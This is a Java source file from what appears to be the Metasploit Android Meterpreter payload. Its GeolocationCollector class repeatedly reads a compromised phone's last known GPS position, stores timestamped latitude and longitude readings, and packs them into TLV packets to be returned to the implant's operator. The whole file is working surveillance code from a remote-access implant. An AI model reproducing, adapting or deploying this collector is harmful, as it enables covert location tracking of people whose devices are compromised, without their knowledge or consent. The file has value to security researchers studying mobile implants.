package com.metasploit.meterpreter;

import com.metasploit.meterpreter.android.interval_collect;

import android.app.Activity;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import java.lang.InterruptedException;
import java.lang.Math;
import java.lang.Override;
import java.lang.Runnable;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Hashtable;

//Logging
import android.util.Log;

//This class
//public class GeolocationCollector extends IntervalCollector implements Runnable {
public class GeolocationCollector extends IntervalCollector  {
    private static final long MINIMUM_DISTANCE_CHANGE_FOR_UPDATES = 1; // in Meters
    private static final long MINIMUM_TIME_BETWEEN_UPDATES = 1000; // in Milliseconds
    
    
    private final Object syncObject = new Object();
    protected LocationManager mLocationManager;
    public Location mLocationObj;
    private Hashtable<Long, GeoModel> collections = null;
    
    private class GeoModel {
        
        public long mUnixEpoch;
        public double  mLatitude,mLongitude;
        public String mGeolatsring,mGeolongstring ;
        
        public void setmUnixEpoch(){
            mUnixEpoch =  System.currentTimeMillis();
        }
        
        public void  setLatitudeAndLong(Location location ){
            mLatitude = location.getLatitude();
            mLongitude = location.getLongitude();
            mGeolatsring    = Double.toString(location.getLatitude());
            mGeolongstring  = Double.toString(location.getLongitude());
        }
        
        public void write(DataOutputStream output) throws IOException {
            
            
            Log.i("Geocollection Interval","in Write function");
            Log.d("Geocollection Interval", "WriteFunction LatString= "+this.mGeolatsring);
            Log.d("Geocollection Interval", "WriteFunction LatString= "+this.mGeolongstring);
            output.writeLong(this.mUnixEpoch);
            output.writeChars(this.mGeolatsring);
            output.writeChars(this.mGeolongstring);
        }
    }
    
    public GeolocationCollector(int collectorId, Context context, long timeout) {
        super(collectorId, context, timeout);
        this.collections = new Hashtable<Long, GeoModel>();
        mLocationManager = (LocationManager) AndroidMeterpreter.getContext()
        .getSystemService(Context.LOCATION_SERVICE);
        Log.i("Geocollection Interval","in GeolocationCollector timeout functoin");
    }
    
    public GeolocationCollector(int collectorId, Context context) {
        super(collectorId, context);
        this.collections = new Hashtable<Long, GeoModel>();
        mLocationManager = (LocationManager) AndroidMeterpreter.getContext()
        .getSystemService(Context.LOCATION_SERVICE);
        Log.i("Geocollection Interval","in GeolocationCollector functoin");
    }
    
    protected void init() {
    }
    
    protected void deinit() {
        
    }
    
    protected boolean collect(DataOutputStream output) throws IOException {
        
        Location location = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        GeoModel lGeoMod = new GeoModel();
        
        lGeoMod.setmUnixEpoch();
        if (location == null) {
            lGeoMod.mLatitude = 0;
            lGeoMod.mLongitude = 0;
        } else {
            lGeoMod.setmUnixEpoch(); 
	  lGeoMod.setLatitudeAndLong(location);
           }
        
        synchronized (this.syncObject) {
            this.collections.put(System.currentTimeMillis(), lGeoMod);
            // collect requires the result to be the serialised version of
            // the collection data so that it can be written to disk
            output.writeLong(this.timeout);
            output.writeInt(this.collections.size());
            for (Long ts : this.collections.keySet()) {
                lGeoMod = this.collections.get(ts.longValue());
                output.writeLong(ts.longValue());
                lGeoMod.write(output);
            }
        }
        
        return true;
    }
    
    protected void loadFromMemory(DataInputStream input) throws IOException {
        this.timeout = input.readLong();
        int collectionCount = input.readInt();
        for (int i = 0; i < collectionCount; ++i) {
            long ts = input.readLong();
            int resultCount = input.readInt();
            
            for (int j = 0; j < resultCount; ++j) {
                GeoModel lGeoModObj  = new   GeoModel();
                lGeoModObj.mUnixEpoch = input.readLong();
	       lGeoModObj.mGeolatsring   =  input.readUTF();
                lGeoModObj.mGeolongstring  =  input.readUTF();
                this.collections.put(ts, lGeoModObj);
            }
        }
    }
    
    public boolean flush(TLVPacket packet) {
        Hashtable<Long, GeoModel> collections = this.collections;
        synchronized (this.syncObject) {
            // create a new collection, for use on the other thread
            // if it's running
            this.collections = new Hashtable<Long, GeoModel>();
        }
        
        List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
        Collections.sort(sortedKeys);
        
        for (Long ts : sortedKeys) {
            long timestamp = ts.longValue();
            GeoModel geoLoc = collections.get(timestamp);
            
            TLVPacket resultSet = new TLVPacket();
            
            try {
                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
            }
            catch (IOException e) {
                Log.d("Geocollection Interval- in flush funtion", Log.getStackTraceString(e.getCause().getCause()));
            }
            
            
            TLVPacket geolocationSet = new TLVPacket();
            Log.d("Geocollection Interval--in flush funtion", "geolocationSet="+geolocationSet);
            try {
                geolocationSet.add(interval_collect.TLV_TYPE_GEO_LAT, geoLoc.mGeolatsring);
                geolocationSet.add(interval_collect.TLV_TYPE_GEO_LONG, geoLoc.mGeolongstring);
                Log.d("Geocollection Interval --in flush funtion", "In Try block geolocationSet="+geolocationSet);
                resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GEO, geolocationSet);
            }
            catch (IOException e) {
                Log.d("Geocollection Interval--in flush funtion", Log.getStackTraceString(e.getCause().getCause()));
            }
            
            
            try {
                Log.d("Geocollection Interval --in flush funtion", "In  packet Try block result Set="+resultSet);
                packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
                // packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GEO, resultSet);
            }
            catch (IOException e) {
                Log.d("Geocollection Interval --in flush funtion", Log.getStackTraceString(e.getCause().getCause()));
            }
        }
        
        return true;
    }
}
